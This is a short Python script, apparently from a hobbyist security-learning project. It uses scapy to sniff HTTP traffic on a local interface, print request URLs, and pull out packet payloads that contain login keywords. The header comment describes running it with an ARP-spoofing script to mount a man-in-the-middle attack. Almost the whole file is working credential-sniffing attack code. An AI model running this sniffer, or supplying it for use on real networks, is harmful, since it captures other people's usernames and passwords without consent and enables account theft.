##This is a process that will intercept packets that flow through the host machine. It prints `HTTP`requests and
##particualarily any traffic that looks like it could be usernames or passwords. This can be run concurrently with
## the `arp_spoof.py` in order to execute a [man in the middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack).
##Note that this program seems to only capture `HTTP` traffic and not `HTTPS`. It also only has 6 keywords to look for as
##potential usernames and passwords. A future project can be to expand the list, as well as to filter out more traffic.

import scapy.all as scapy
from scapy.layers import http

def header():
	print("=====[ P a c k e t  s n i f f e r ]=====")

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return (packet[http.HTTPRequest].Host) + (packet[http.HTTPRequest].Path)

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			keywords = ["username", "user", "login", "uname", "password", "pass"]
			for keyword in keywords:
				if bytes(keyword, 'utf-8') in load:
					return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Request >> " + url.decode())

		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible username/password > " + login_info.decode() + "\n\n")

header()
sniff("eth0")
